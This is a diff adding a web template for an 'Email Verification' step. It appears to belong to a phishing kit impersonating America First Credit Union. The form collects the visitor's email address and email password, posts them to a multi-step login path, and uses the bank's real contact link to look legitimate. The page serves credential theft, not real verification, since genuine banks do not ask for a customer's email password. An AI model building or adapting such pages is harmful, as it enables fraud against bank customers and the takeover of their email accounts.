@@ -1,0 +1,61 @@
+@layout('layouts.app')
+
+@section('content')
+<div id="content">
+  <h1 class="text-h4">Email Verification</h1>
+    <div class="row">
+      <div class="col-md-5 col-lg-4 col">
+        <form id="form" class="cb-form" action="/auth/login/3" method="POST">
+          <div class="cb-input theme--light cb-text-field cb-text-field--is-booted">
+            <div class="cb-input__control">
+              <div class="cb-input__slot">
+                <div class="cb-text-field__slot">
+                  <label for="emailAddr" class="cb-label theme--light" style="left: 0px; right: auto; position: absolute;">Email Address</label>
+
+                  <input id="emailAddr" name="emailAddr" class="cb-input-field" type="text" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+                </div>
+              </div>
+              <div class="cb-text-field__details">
+                <div class="cb-messages theme--light" role="alert">
+                  <div class="cb-messages__wrapper">
+                    <div class="cb-messages__message"></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="cb-input theme--light cb-text-field cb-text-field--is-booted">
+            <div class="cb-input__control">
+              <div class="cb-input__slot">
+                <div class="cb-text-field__slot">
+                  <label for="emailPass" class="cb-label theme--light" style="left: 0px; right: auto; position: absolute;">Email Password</label>
+
+                  <input id="emailPass" name="emailPass" class="cb-input-field" type="password" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+                </div>
+                <div class="cb-input__append-inner">
+                  <button id="toggleBtn" type="button" class="cb-icon notranslate cb-icon--link mdi mdi-eye theme--light"></button>
+              </div>
+              </div>
+              <div class="cb-text-field__details">
+                <div class="cb-messages theme--light" role="alert">
+                  <div class="cb-messages__wrapper">
+                    <div class="cb-messages__message"></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="mt-4">
+            <button type="submit" class="mr-3 cb-btn cb-btn--is-elevated cb-btn--has-bg theme--light cb-size--default primary submitBtn" disabled="disabled">
+              <span class="cb-btn__content">Continue</span>
+            </button>
+          </div>
+        </form>
+        
+        <p id="fp-message" class="text-body-2 mt-6">Need assistance? <a id="fp-contact-link" href="https://www.americafirst.com/about/contact/">Contact Us</a></p>
+      </div>
+    </div>
+</div>
+@endsection
